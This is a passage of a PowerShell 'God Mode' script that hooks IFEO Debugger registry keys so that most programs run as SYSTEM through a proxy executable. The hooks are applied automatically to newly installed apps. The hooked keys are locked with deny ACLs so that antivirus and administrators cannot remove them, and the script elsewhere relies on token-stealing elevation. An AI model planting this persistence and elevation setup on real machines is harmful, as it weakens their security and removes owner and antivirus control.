            "regedit.exe","msconfig.exe","mspaint.exe","calc.exe","snippingtool.exe","snipaste.exe",
            # Administrator / management tools -- mmc.exe hosts ALL .msc snap-ins
            # (services, eventvwr, compmgmt, gpedit, secpol, lusrmgr, certmgr, diskmgmt,
            # taskschd, fsmgmt, wf, ...); perfmon.exe + resmon.exe are thin launchers that
            # delegate to mmc.exe. mmc.exe silently refuses SYSTEM: exits 0, no window -- the
            # MMC host relies on per-user profile/COM resources that don't work as SYSTEM in
            # an interactive session. gmproxy's IFEO-bypass RENAME (gmproxy_<pid>_mmc.exe
            # hardlink) breaks MMC the SAME way as an AppX/Store stub: MMC can't load snap-ins
            # from a differently-named exe (COM/snap-in/resource lookup uses the exe name), so
            # it exits 0 with no window EVEN as the current user (USER-AUTOEXCLUDE mode) -- a
            # VM log dump proved this: hardlink=gmproxy_5500_mmc.exe ... EXITED exitcode=0
            # class=CLEAN tree=0 (mode=USER-AUTOEXCLUDE). So mmc/perfmon/resmon are DROPPED
            # from IFEO entirely (like browsers + AppX stubs) so they launch NATIVELY as the
            # admin user -- no gmproxy, no rename, no breakage. They are in the
            # $GmCriticalIfeoExclude denylist (auto-populate never hooks them), cleaned up on
            # re-enable (prior IFEO hook removed below), and pre-seeded in the Detector B store
            # with reason 'G' so the monitor + gmhook skip SYSTEM-birth (an in-place SYSTEM
            # token swap would break mmc the same way). services.msc / eventvwr / perfmon /
            # resmon all open normally as admin -- SYSTEM is wrong for MMC, native admin launch
            # is the only way they work.
            "steam.exe","epicgameslauncher.exe","origin.exe","uplay.exe","battle.net.exe","minecraft.exe"
        )

        # Detector A: build the SYSTEM-incompatible base-name sets (AppX/UWP +
        # registered browsers) ONCE. BROWSERS + AppX/WinUI Store-redirector
        # stubs are BOTH dropped from the hook set (launch as user from launch
        # #1) + persisted to the auto-exclude store (reason 'P' browser / 'A'
        # AppX) so gmproxy + gmhook + the monitor skip them from launch #1.
        # AppX/Store stubs cannot run as SYSTEM (AppX activation needs user
        # identity) AND gmproxy's IFEO-bypass rename breaks their App Execution
        # Alias redirect + .mui lookup, so native user launch is the only way
        # they start. Fail-open (empty sets -> no drop -> gmproxy.c's
        # GmProxyIsAppExecutionAliasStub runtime guard is the safety net).
        $CompatExclusions = Get-GmSystemCompatExclusions

        # Auto-populate additional candidates from installed/running programs,
        # passing the compat sets so the same browser-only filter applies there.
        $autoCandidates = Get-IfeoElevationCandidates -GmProxyExe $GmProxyExe -CompatExclusions $CompatExclusions

        # Filter the curated seed through the compat sets (the seed bypasses
        # Get-IfeoElevationCandidates' path/denylist filters, so browser names
        # like chrome.exe / firefox.exe AND AppX/Store-stub names (notepad.exe,
        # calc.exe, mspaint.exe, photos.exe, ...) in the seed must be dropped
        # here explicitly). AppX/Store stubs are dropped (NOT hooked) + the full
        # AppX set is persisted to the store with reason 'A' below so gmproxy +
        # gmhook + the monitor exclude them from launch #1. Collect the dropped
        # BROWSER + AppX seed names (browsers persisted with default 'P'; AppX
        # seed names drive the prior-IFEO-hook cleanup below).
        $seedDroppedBrowser = 0
        $seedDroppedAppx = 0
        $droppedBrowserNames = @()
        $droppedAppxNames = @()
        $filteredSeed = @()
        foreach ($app in $IfeoElevationApps) {
            $bk = $app.ToLower()
            if ($CompatExclusions.Browser.ContainsKey($bk)) { $seedDroppedBrowser++; $droppedBrowserNames += $app; continue }
            if ($CompatExclusions.AppX.ContainsKey($bk)) { $seedDroppedAppx++; $droppedAppxNames += $app; continue }
            $filteredSeed += $app
        }
        $allApps = $filteredSeed + $autoCandidates | Select-Object -Unique

        # Detector A persist: write the dropped BROWSER base names to the
        # auto-exclude store at threshold (count=2, excluded=1, reason 'P') so
        # gmproxy + gmhook + the monitor all treat them as excluded from the
        # FIRST launch after enable -- defense-in-depth alongside the IFEO drop
        # (covers the gmhook child-birth path + the monitor periodic scan,
        # which the IFEO drop alone does not reach).
        if ($droppedBrowserNames.Count -gt 0) {
            Add-GmAutoExcludeEntries -BaseNames $droppedBrowserNames
        }
        # Detector A persist (AppX/WinUI Store-redirector stubs): write the FULL
        # AppX set to the auto-exclude store with reason 'A' so gmproxy + gmhook
        # + the monitor skip SYSTEM-birth for EVERY detected Store/WinUI app
        # from launch #1 (not just the seed names). AppX apps cannot run as
        # SYSTEM (AppX package activation needs user identity) AND gmproxy's
        # IFEO-bypass rename breaks their Store redirect (the notepad stub case),
        # so launching them natively as the user is the only way they start. No
        # hardcoded names -- the AppX set is the runtime alias-reparse +
        # AppxPackage enumeration in Get-GmSystemCompatExclusions. Fail-open
        # (empty set -> no persist -> gmproxy.c alias-stub guard is the runtime
        # safety net). The store's 256-cap + 30-day stale bound the growth.
        if ($CompatExclusions.AppX.Count -gt 0) {
            Add-GmAutoExcludeEntries -BaseNames @($CompatExclusions.AppX.Keys) -Reason 'A'
        }

        # Detector B pre-seed (CLEAN-GUI admin tool): mmc.exe hosts every .msc snap-in
        # (services, eventvwr, compmgmt, gpedit, secpol, lusrmgr, ...). It silently refuses
        # SYSTEM -- launches as SYSTEM, exits 0, renders no window (the MMC host relies on
        # per-user profile/COM resources that don't work as SYSTEM in an interactive session).
        # AND gmproxy's IFEO-bypass RENAME breaks MMC even as the current user (see the
        # admin-tools comment in $IfeoElevationApps above), so mmc/perfmon/resmon are DROPPED
        # from IFEO entirely (not retained) + cleaned up below + pre-seeded here with reason
        # 'G' so the monitor + gmhook also skip SYSTEM-birth (an in-place SYSTEM token swap
        # would break mmc the same way). mmc launches NATIVELY as the admin user from launch
        # #1. Menu [18] RESET AUTO-EXCLUDE STORE clears the pre-seed (the next ToggleOn
        # re-seeds it). Fail-open (Add-GmAutoExcludeEntries swallows errors; never blocks
        # the install). Merge-safe: if the store already has a runtime mmc.exe entry, the
        # higher count is kept and excluded is never downgraded.
        $preseededCleanGui = @('mmc.exe')
        Add-GmAutoExcludeEntries -BaseNames $preseededCleanGui -Reason 'G'
        # perfmon.exe + resmon.exe are also pre-seeded with reason 'G' (they delegate to
        # mmc.exe / host their own GUI; an in-place SYSTEM token swap by the monitor would
        # break them the same way mmc breaks as SYSTEM). Pre-seeding means the monitor's
        # periodic scan + 5s polling + gmhook all skip them from launch #1. Additive to the
        # mmc.exe pre-seed above (kept intact for the $preseededCleanGui variable contract).
        $preseededCleanGuiAdmin = @('perfmon.exe','resmon.exe')
        Add-GmAutoExcludeEntries -BaseNames $preseededCleanGuiAdmin -Reason 'G'

        $IfeoBase = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $hooked = 0; $skipped = 0; $failed = 0

        # Detector A cleanup: REMOVE any existing IFEO Debugger hook for the
        # dropped AppX seed names so a re-enable on a VM that previously hooked
        # them (before this strategy flip) cleans up the prior hook -- otherwise
        # notepad.exe / mspaint.exe / calc.exe etc. would stay IFEO-hooked and
        # keep launching via gmproxy's broken renamed copy (exit 0, no window).
        # Mirrors Uninstall-IfeoElevation's per-key cleanup (Restore-RegistryKey
        # lifts the hardened deny ACL, then remove Debugger + key). Only ever
        # touches keys whose Debugger points at gmproxy (never an unrelated
        # IFEO key). Best-effort; counts surface in the summary log + debug EXIT.
        $appxHookRemoved = 0; $appxHookRemoveFailed = 0
        foreach ($app in $droppedAppxNames) {
            $appKey = Join-Path $IfeoBase $app
            if (-not (Test-Path $appKey)) { continue }
            $dbg = $null
            try { $dbg = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger } catch {}
            if (-not $dbg -or $dbg -notlike "*gmproxy*") { continue }
            try {
                $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$app"
                Remove-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue
                Remove-Item -Path $appKey -Force -ErrorAction SilentlyContinue
                if (-not (Test-Path $appKey)) { $appxHookRemoved++ } else { $appxHookRemoveFailed++ }
            } catch {
                $appxHookRemoveFailed++
                Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "Failed to remove prior AppX IFEO hook for $app`: $_"
            }
        }

        # Admin-tools legacy IFEO cleanup: mmc.exe / perfmon.exe / resmon.exe were
        # IFEO-hooked under the OLD strategy (the seed listed them as "known-good as
        # SYSTEM" + pre-seeded reason 'G' but RETAINED the IFEO hook so menu [18]
        # could retry SYSTEM). The new strategy DROPS them from IFEO entirely
        # (gmproxy's IFEO-bypass RENAME breaks MMC snap-in loading -- COM/snap-in/
        # resource lookup uses the exe name, so a renamed gmproxy_<pid>_mmc.exe
        # can't load snap-ins and exits 0 with no window EVEN as the current user,
        # the USER-AUTOEXCLUDE mode a VM log dump proved). So a re-enable on a VM
        # that previously hooked them MUST remove the prior gmproxy Debugger key or
        # mmc/perfmon/resmon stay IFEO-hooked and keep launching via gmproxy's
        # broken renamed copy (exit 0, no window) -- the exact "admin tools won't
        # launch" symptom. Mirrors the AppX cleanup loop above +
        # Uninstall-IfeoElevation's per-key cleanup (Restore-RegistryKey lifts the
        # hardened deny ACL, then remove Debugger + key). Only ever touches keys
        # whose Debugger points at gmproxy (never an unrelated IFEO key). The names
        # are the pre-seed set ($preseededCleanGui + $preseededCleanGuiAdmin,
        # defined above) -- a FIXED known set (not the dynamic AppX set). Best-
        # effort; counts surface in the summary log + debug EXIT.
        $adminToolNames = @($preseededCleanGui) + @($preseededCleanGuiAdmin)
        $adminHookRemoved = 0; $adminHookRemoveFailed = 0
        foreach ($app in $adminToolNames) {
            $appKey = Join-Path $IfeoBase $app
            if (-not (Test-Path $appKey)) { continue }
            $dbg = $null
            try { $dbg = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger } catch {}
            if (-not $dbg -or $dbg -notlike "*gmproxy*") { continue }
            try {
                $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$app"
                Remove-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue
                Remove-Item -Path $appKey -Force -ErrorAction SilentlyContinue
                if (-not (Test-Path $appKey)) { $adminHookRemoved++ } else { $adminHookRemoveFailed++ }
            } catch {
                $adminHookRemoveFailed++
                Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "Failed to remove prior admin-tool IFEO hook for $app`: $_"
            }
        }

        foreach ($app in $allApps) {
            $appKey = Join-Path $IfeoBase $app
            try {
                $existing = $null
                if (Test-Path $appKey) {
                    $existing = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
                }
                if ($existing -and $existing -like "*gmproxy*") {
                    # Idempotent: already pointing at gmproxy. Just re-harden to be safe.
                    $skipped++
                } else {
                    # If a prior Harden-RegistryKey left deny rules on this key, an admin
                    # Set-ItemProperty can fail (denied SetValue). Restore the ACL first so
                    # the write succeeds, then re-harden after setting the Debugger value.
                    if (Test-Path $appKey) {
                        $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$app"
                    } else {
                        New-Item -Path $appKey -Force -ErrorAction SilentlyContinue | Out-Null
                    }
                    Set-ItemProperty -Path $appKey -Name "Debugger" -Value $GmProxyExe -Force -ErrorAction SilentlyContinue
                    $hooked++
                }
                # Harden so AV/user cannot remove the Debugger value. Harden-RegistryKey
                # denies Admins/Everyone/AuthenticatedUsers SetValue/Delete/WriteKey while
                # preserving the inherited SYSTEM FullControl as an explicit allow.
                $null = Harden-RegistryKey -Path "$IfeoBaseSubKey\$app"
            } catch {
                $failed++
                Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "Failed to hook $app`: $_"
            }
        }
        $autoCount = $autoCandidates.Count
        $seedCount = $filteredSeed.Count
        $totalUnique = $allApps.Count
        $dedupOverlap = ($seedCount + $autoCount) - $totalUnique
        if ($dedupOverlap -lt 0) { $dedupOverlap = 0 }
        Write-Log -Message "IFEO elevation: $hooked hooked, $skipped already hooked, $failed failed. ($seedCount curated seed + $autoCount auto-populated = $totalUnique unique targets, $dedupOverlap deduped overlap). Detector A dropped $seedDroppedBrowser browser + $seedDroppedAppx AppX/Store-stub from the seed (launch as user from launch #1; browsers persisted reason 'P', AppX set persisted reason 'A'). AppX/Store-redirector stubs (notepad/mspaint/calc/photos/etc.) are NOT IFEO-hooked -- they cannot run as SYSTEM (AppX activation needs user identity) and gmproxy's rename/copy breaks their Store redirect, so they launch natively as the user via the App Execution Alias. Prior AppX IFEO hooks removed: $appxHookRemoved (failed: $appxHookRemoveFailed). Admin tools (mmc/perfmon/resmon) DROPPED from IFEO (gmproxy rename breaks MMC snap-in loading) + pre-seeded reason 'G' so the monitor + gmhook skip SYSTEM-birth; they launch NATIVELY as the admin user. Prior admin-tool IFEO hooks removed: $adminHookRemoved (failed: $adminHookRemoveFailed). Detector B pre-seeded $($preseededCleanGui.Count) + $($preseededCleanGuiAdmin.Count) CLEAN-GUI admin tools (mmc.exe reason 'G' silently refuses SYSTEM; perfmon.exe + resmon.exe reason 'G' delegate to mmc; launched as user from launch #1, NO IFEO hook). Normal programs now launch as SYSTEM via gmproxy." -Type "INFO" -Color Green
        Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "EXIT" -Message "hooked=$hooked skipped=$skipped failed=$failed seed=$seedCount auto=$autoCount unique=$totalUnique droppedBrowser=$seedDroppedBrowser persistedBrowser=$($droppedBrowserNames.Count) droppedAppx=$seedDroppedAppx persistedAppx=$($CompatExclusions.AppX.Count) appxHookRemoved=$appxHookRemoved appxHookRemoveFailed=$appxHookRemoveFailed adminHookRemoved=$adminHookRemoved adminHookRemoveFailed=$adminHookRemoveFailed preseededCleanGui=$($preseededCleanGui.Count) preseededCleanGuiAdmin=$($preseededCleanGuiAdmin.Count)"
        return $true
    } catch {
        Write-Log -Message "Install-IfeoElevation failed: $_" -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "ERROR" -Message "Outer catch: $_"
        return $false
    }
}

function Uninstall-IfeoElevation {
    Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "ENTRY"
    try {
        $IfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $removed = 0; $failed = 0; $scanned = 0

        # Enumerate every IFEO subkey and remove any whose Debugger value points at gmproxy.
        # This is robust against: curated seed apps, auto-populated apps, legacy lists,
        # apps uninstalled between enable/disable, and future dynamic keys.
        if (Test-Path $IfeoBase) {
            $subKeys = Get-ChildItem -Path $IfeoBase -ErrorAction SilentlyContinue
            foreach ($subKey in $subKeys) {
                $appName = $subKey.PSChildName
                $appKey = $subKey.PSPath
                $debugger = $null
                try {
                    $debugger = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
                } catch {}
                $scanned++
                if (-not $debugger -or $debugger -notlike "*gmproxy*") { continue }
                try {
                    # Keys are hardened (Admins denied Delete/WriteKey). Restore-RegistryKey
                    # removes the deny rules + re-enables inheritance (with a SYSTEM fallback),
                    # after which an admin can delete the Debugger value and the key itself.
                    $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$appName"
                    Remove-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue
                    Remove-Item -Path $appKey -Force -ErrorAction SilentlyContinue
                    if (-not (Test-Path $appKey)) { $removed++ } else { $failed++ }
                } catch {
                    $failed++
                    Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "WARN" -Message "Failed to unhook $appName`: $_"
                }
            }
        }
        Write-Log -Message "IFEO elevation removed: $removed removed, $failed failed (scanned $scanned IFEO keys)." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "EXIT" -Message "removed=$removed failed=$failed scanned=$scanned"
    } catch {
        Write-Log -Message "Uninstall-IfeoElevation failed: $_" -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "ERROR" -Message "Outer catch: $_"
    }
}

function Elevate-Process {
    param(
        [string]$Path,
        [string]$Arguments = ""
    )
    # Hybrid elevation: token stealing first, scheduled task fallback.
    # This centralizes all elevation logic so both Invoke-ExistingProcessElevation
    # and Start-Monitoring automatically get the dual-path robustness.
    $null = Invoke-HybridElevation -Path $Path -Arguments $Arguments
}

function Add-IfeoElevationForApp {
    <#
    .SYNOPSIS
        Idempotent single-app IFEO hook (Debugger -> gmproxy.exe) for the instant
        new-app watcher. Returns $true ONLY when a genuinely-new app was hooked;
        $false (no-op, NO retrigger) when the app is already hooked, denied, or
        unsafe -- so the watcher never fires twice for the same app and never
        fires at all when there is nothing new to add.
    .DESCRIPTION
        Mirrors Install-IfeoElevation's per-key logic for ONE app path with the
        SAME triple safety net as Get-IfeoElevationCandidates (canonical name
        denylist = union of every critical/shell/OS list, Windows/System32/
        SysWOW64 path-exclusion, .exe-only). The denylist is intentionally
        duplicated from Get-IfeoElevationCandidates (kept inline there so
        Test-IfeoElevation.ps1 section 6b denylist assertions stay green); keep
        the two lists in sync. Uninstall-IfeoElevation already enumerates every
        IFEO key by Debugger-contains-gmproxy, so keys added here are cleaned up
        automatically on Disable-GodMode (no uninstaller change needed).
    #>
    param([string]$AppExePath)
    if (-not $AppExePath) { return $false }
    $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
    if (-not (Test-Path $GmProxyExe)) { return $false }
    try {
        if ($AppExePath -notmatch '\.exe\s*$') { return $false }
        $fullPath = $AppExePath.Trim()
        $baseName = [System.IO.Path]::GetFileName($fullPath)
        if ([string]::IsNullOrWhiteSpace($baseName)) { return $false }
        $baseKey = $baseName.ToLower()
        $bare = [System.IO.Path]::GetFileNameWithoutExtension($baseName).ToLower()

        # Safety net #1: canonical name denylist (same content as
        # Get-IfeoElevationCandidates -> keep the two lists in sync).
        $deny = @(
            "csrss","lsass","services","smss","winlogon","wininit","svchost","dwm","fontdrvhost",
            "System","Registry","Memory Compression","Secure System","Idle",
            "cmd","powershell","pwsh","wt","conhost","OpenConsole","WindowsTerminal","wsl","wslhost",
            "RuntimeBroker","ApplicationFrameHost","ShellExperienceHost","SearchUI","SearchIndexer",
            "SearchProtocolHost","SearchFilterHost","SearchHost","StartMenuExperienceHost","TextInputHost",
            "SystemSettingsBroker","SystemSettings","ShellHost","sihost","taskhostw","ctfmon","LockApp",
            "LogonUI","SecurityHealthSystray","SecurityHealthService","MsMpEng","MsMpEngCP",
            "MpDefenderCoreService","MsSense","MpCmdRun","NisSrv","SgrmBroker","TiWorker","CompatTelRunner",
            "WUDFHost","WmiPrvSE","unsecapp","dllhost","rundll32","regsvr32","WmiApSrv",
            "sc","schtasks","wmic","reg","wscript","cscript","mshta","bcdedit","reagentc","wevtutil",
            "netsh","ipconfig","net","taskkill","whoami",
            "explorer","taskmgr",
            "gmproxy","gmhook"
        )
        $denySet = @{}
        foreach ($n in $deny) {
            $denySet[$n.ToLower()] = $true
            if ($n -notmatch '\.exe$') { $denySet[("$n.exe").ToLower()] = $true }
        }
        if ($denySet.ContainsKey($baseKey)) { return $false }
        if ($denySet.ContainsKey($bare)) { return $false }

        # Safety net #2: path hard-exclusion (Windows/System32/SysWOW64) + never
        # hook gmproxy's own image.
        $norm = $fullPath.Replace('/', '\').ToLower()
        $gmProxyNorm = $GmProxyExe.Replace('/', '\').ToLower()
        if ($norm -eq $gmProxyNorm) { return $false }
        if ($norm -like "*\windows\system32\*" -or $norm -like "*\windows\syswow64\*" -or $norm -match '\\windows\\[^\\]+\.exe$') { return $false }

        $IfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $appKey = Join-Path $IfeoBase $baseName

        # Safety net #4 (Detector A): never IFEO-hook an App Execution Alias
        # stub (a Win11 Store-redirector like notepad/mspaint/calc/photos).
        # gmproxy's IFEO-bypass rename/copy breaks their App Execution Alias
        # redirect + .mui resource lookup, so they exit 0 with no window as
        # BOTH SYSTEM and user. Smart detection: the alias is a 0-byte reparse
        # point at %LOCALAPPDATA%\Microsoft\WindowsApps\<base>. No hardcoded
        # names -- whatever base the watcher sees, if it has a Store alias, skip
        # hooking. Fail-open: if the alias dir/file is missing or the attr read
        # fails, continue (Install-IfeoElevation's install-time AppX drop is the
        # primary gate; this is the watcher defense-in-depth).
        try {
            $aliasDir = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps'
            if ($aliasDir -and (Test-Path $aliasDir)) {
                $aliasFile = Join-Path $aliasDir $baseName
                if (Test-Path $aliasFile) {
                    $aliasItem = Get-Item $aliasFile -Force -ErrorAction SilentlyContinue
                    if ($aliasItem -and ($aliasItem.Attributes.ToString() -match 'ReparsePoint')) {
                        Write-DebugLog -FunctionName "Add-IfeoElevationForApp" -Action "SKIP-APPAlias" -Message "$baseName is an App Execution Alias stub (Store-redirector); not IFEO-hooked (gmproxy rename/copy breaks the Store redirect)"
                        return $false
                    }
                }
            }
        } catch {}

        # Idempotent gate (no retrigger): already pointing at gmproxy -> do nothing.
        $existing = $null
        if (Test-Path $appKey) {
            $existing = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
        }
        if ($existing -and $existing -like "*gmproxy*") { return $false }

        # Genuinely new -> create/restore + set Debugger + harden (mirrors Install-IfeoElevation).
        if (Test-Path $appKey) {
            $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$baseName"
        } else {
            New-Item -Path $appKey -Force -ErrorAction SilentlyContinue | Out-Null
        }
        Set-ItemProperty -Path $appKey -Name "Debugger" -Value $GmProxyExe -Force -ErrorAction SilentlyContinue
        $null = Harden-RegistryKey -Path "$IfeoBaseSubKey\$baseName"
        Write-Log -Message "IFEO instant auto-add: hooked $baseName (newly installed program now born as SYSTEM via gmproxy on every future launch)." -Type "INFO" -Color Green
        Write-DebugLog -FunctionName "Add-IfeoElevationForApp" -Action "ADD" -Message "hooked $baseName from $fullPath"
        return $true
    } catch {
        Write-DebugLog -FunctionName "Add-IfeoElevationForApp" -Action "WARN" -Message "Failed for $AppExePath`: $_"
        return $false
    }
}

function Remove-IfeoElevationForApp {
    <#
    .SYNOPSIS
        Idempotent single-app IFEO unhook for the deferred stale-prune watcher.
        Returns $true ONLY when a gmproxy-hooked key was removed; $false (no-op,
        NO retrigger) when the key is absent, already clean, or belongs to a
        non-gmproxy debugger -- so the prune never touches unrelated IFEO keys
        and never fires twice for the same app.
    .DESCRIPTION
        Mirrors Uninstall-IfeoElevation's per-key cleanup (Restore-RegistryKey
        removes the hardened deny ACL + re-enables inheritance with a SYSTEM
        fallback, after which an admin can delete the Debugger value and the
        key itself) for ONE base name. Guarded by Debugger -like '*gmproxy*'
        so an app that was hooked by another tool, or re-pointed at a different
        debugger, is left untouched. Used by the Start-IfeoNewAppWatcher Deleted
        drain after the grace-period re-scan confirms the app is gone everywhere.
    #>
    param([string]$BaseName)
    if (-not $BaseName) { return $false }
    try {
        $IfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $appKey = Join-Path $IfeoBase $BaseName
        # No key -> nothing to prune (no retrigger).
        if (-not (Test-Path $appKey)) { return $false }
        $debugger = $null
        try {
            $debugger = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
        } catch {}
        # Only ever touch keys WE set (Debugger -> gmproxy). Never touch an
        # unrelated IFEO key, and never retrigger when already clean.
        if (-not $debugger -or $debugger -notlike "*gmproxy*") { return $false }
        $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$BaseName"
        Remove-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue
        Remove-Item -Path $appKey -Force -ErrorAction SilentlyContinue
        $removed = (-not (Test-Path $appKey))
        Write-Log -Message "IFEO stale-prune: removed hook for $BaseName (program uninstalled -- no .exe anywhere, key was dormant)." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Remove-IfeoElevationForApp" -Action "REMOVE" -Message "removed=$removed for $BaseName"
        return $removed
    } catch {
        Write-DebugLog -FunctionName "Remove-IfeoElevationForApp" -Action "WARN" -Message "Failed for $BaseName`: $_"
        return $false
    }
}

function Test-BaseNameGoneEverywhere {
    <#
    .SYNOPSIS
        Re-scans the IFEO watcher install dirs for a base name; returns $true
        only when the .exe is absent everywhere (truly uninstalled).
    .DESCRIPTION
        Searches C:\Program Files, C:\Program Files (x86), and each real user's
        AppData\Local\Programs (the same sources Start-IfeoNewAppWatcher watches)
        recursively for any file matching the base name. Used by the deferred
        stale-prune drain AFTER the grace period to decide whether a gmproxy
        IFEO key should be removed: an updater that deleted the old .exe but has
        already written the new one will still be found here, so the key is kept
        (no retrigger). Conservative: on any error returns $false (do NOT prune).
    #>
    param([string]$BaseName)
    if (-not $BaseName) { return $false }
    try {
        $searchDirs = @()
        $pf1 = "C:\Program Files"
        $pf2 = "C:\Program Files (x86)"
        if (Test-Path $pf1) { $searchDirs += $pf1 }
        if (Test-Path $pf2) { $searchDirs += $pf2 }
        try {
            Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -notin @('Public','Default','Default User','All Users') -and
                (Test-Path (Join-Path $_.FullName 'AppData\Local\Programs'))
            } | ForEach-Object { $searchDirs += (Join-Path $_.FullName 'AppData\Local\Programs') }
        } catch {}
        foreach ($dir in $searchDirs) {
            try {
                $hits = Get-ChildItem -Path $dir -Filter $BaseName -Recurse -File -ErrorAction SilentlyContinue
                if ($hits) { return $false }
            } catch {}
        }
        return $true
    } catch {
        return $false
    }
}

function Test-SystemProcessExists {
    # Session-aware: by default any SYSTEM instance counts. With -InteractiveOnly,
    # only a SYSTEM instance in an INTERACTIVE session (SessionId > 0) counts --
    # mirrors Find-SystemProcessCandidate's Session>0 filter + gmhook.c FindSystemPid
    # active-session filter. This stops the monitor's OWN headless Session-0 SYSTEM
    # powershell.exe from falsely satisfying "a SYSTEM instance exists" for an
    # interactive-shell name (which would trigger Stop-NonSystemInstances to kill
    # the user's admin shell instead of in-place-elevating it). Fail-open.
    param([string]$ProcessName, [switch]$InteractiveOnly)
    try {
        $procs = Get-CimInstance Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    if ($InteractiveOnly -and $p.SessionId -le 0) { continue }
                    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($owner.User -eq "SYSTEM") { return $true }
                } catch { }
            }
        }
    } catch { }
    return $false
}

function Test-PidIsSystem {
    # Per-PID SYSTEM check (fail-open): returns $true ONLY when the process is
    # confirmed running as SYSTEM. Any query/parse failure -> $false so the
    # caller (Monitor-ElevateProcess) still proceeds with elevation and never
    # strands a shell on a transient WMI hiccup. Used to skip a redundant
    # SYSTEM->SYSTEM in-place token swap on a shell that is ALREADY SYSTEM --
    # e.g. one launched on demand via -LaunchShellAsSystem / menu [19] with
    # CreateProcessFromToken (the monitor's WMI watcher + 5s polling will still
    # see the new shell, but Test-PidIsSystem short-circuits the re-elevation).
    param([int]$ProcessId)
    if ($ProcessId -le 0) { return $false }
    try {
        $p = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
        if (-not $p) { return $false }
        $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
        if ($owner -and $owner.User -eq "SYSTEM") { return $true }
    } catch {}
    return $false
}

function Stop-NonSystemInstances {
    param([string]$ProcessName)
    try {
        $procs = Get-CimInstance Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    # Never kill God Mode's OWN plumbing shells (scheduled-task /
                    # Run-key / temp-copy launches of this script carrying
                    # -ToggleOn/-ElevateAllProcesses/-SystemDesktop/GodMode.ps1)
                    # even if momentarily non-SYSTEM -- defense-in-depth alongside
                    # Monitor-ElevateProcess's Test-GmPlumbingShell consult, so a
                    # purge called from ANY path (Phase 1/2 fallback, periodic scan)
                    # can never take down the monitor/watchdog/guardian plumbing.
                    if (Test-GmPlumbingShell -ProcessId $p.ProcessId) { continue }
                    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
                    # Blank/unresolvable owner (common in the brief window right after an IFEO/gmproxy
                    # launch, before WMI can resolve the new logon session) must NOT be treated as
                    # non-SYSTEM -- otherwise the monitor kills freshly-born SYSTEM apps (Chrome
                    # instant-kill / Firefox ownerless). Only kill when the owner is KNOWN and non-SYSTEM.
                    if ($owner -and $owner.User -and $owner.User -ne "SYSTEM") {
                        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
                        Write-Log -Message "Killed non-SYSTEM $ProcessName PID=$($p.ProcessId) to force SYSTEM-only" -Type "INFO" -Color Gray
                    }
                } catch { }
            }
        }
    } catch { }
}

function Get-OptimalThreadCount {
    # Thread count for the parallel WMI/elevation scans (Invoke-ParallelElevation /
    # Get-NonSystemProcessesParallel). The workload is I/O-bound (Get-CimInstance
    # round-trips + CreateProcessAsSystem), so LOGICAL processors are the right
    # unit -- more threads than physical cores overlaps WMI latency. Resolution
    # order: $env:GODMODE_JOBS override (consistency with syntax_check.ps1; lets
    # the user tune a low-core VM or force serial GODMODE_JOBS=1) ->
    # [Environment]::ProcessorCount -> $env:NUMBER_OF_PROCESSORS -> 4. Clamp to
